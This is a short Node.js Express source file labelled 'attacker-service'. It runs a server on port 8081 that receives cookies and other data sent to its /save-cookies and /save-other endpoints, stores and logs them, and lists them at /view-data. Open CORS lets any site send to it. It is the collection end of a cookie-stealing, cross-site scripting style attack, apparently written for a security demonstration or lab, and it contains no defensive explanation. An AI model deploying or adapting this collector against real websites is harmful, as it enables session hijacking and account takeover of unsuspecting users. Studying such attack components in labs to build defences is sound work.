import express from 'express';
import cookieParser from "cookie-parser";
import cors from 'cors';
import {createLogger} from "bunyan";
import qs from 'qs';

const logger = createLogger({ name: 'attacker-service' });

const app = express();
const capturedCookies = new Set();
const capturedOtherData = [];

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.disable('x-powered-by');

app.get('/view-data', (req, res) => {
  const dataAsArray = Array(...capturedCookies);
  res.json({ capturedCookies: dataAsArray, capturedOtherData });
});

app.get('/save-cookies', (req, res) => {
  const cookie = decodeURIComponent(req.query.cookies);
  capturedCookies.add(cookie);
  logger.info('Saved data: ', cookie);
  res.end();
});

app.get('/save-other', (req, res) => {
  const parsed = qs.parse(req.query);
  logger.info(parsed);
  capturedOtherData.push(parsed);
  res.end();
});

app.listen(8081, '0.0.0.0', () => {
  logger.info('Attacker listening at address http://localhost:8081');
  logger.info('GET /view-data');
  logger.info('GET /save-cookies');
  logger.info('GET /save-other');
});
